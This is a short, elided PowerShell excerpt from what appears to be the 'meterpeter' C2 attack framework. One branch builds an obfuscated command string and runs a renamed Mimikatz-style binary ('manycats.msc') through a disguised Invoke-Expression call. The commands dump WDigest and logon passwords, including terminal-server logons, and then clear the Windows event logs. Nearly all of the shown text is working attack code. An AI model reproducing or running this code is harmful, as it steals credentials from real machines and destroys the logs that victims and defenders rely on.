...
If($ManyCats.IsPresent)
{
   ...
   Else
   {
      ...
      Else
      {
         ...
         {
            write-host " multiple modules.`n"
            ## Function for meterpeter C2 usage [ -banner 'false' -wdigest 'false' -manycats -module 'auto' ]
            $Navigator = "n%e@t:_:g%ro@up s%ek@url@sa:_:wd%ig@est s%eku@rls@a:_:log@onpas@swo%rds t%s:_:log@onpa%ss@wor%ds t%s:_:ms@ts%c e%ve@nt:_:c%le@ar exit"
            $Automatic = $Navigator -replace '%','' -replace '@','' -replace '_',''
            &('xEx' -replace '^(x)','i') ".\manycats.msc $Automatic"
         }
         Else
         {
            write-host " multiple modules.`n"
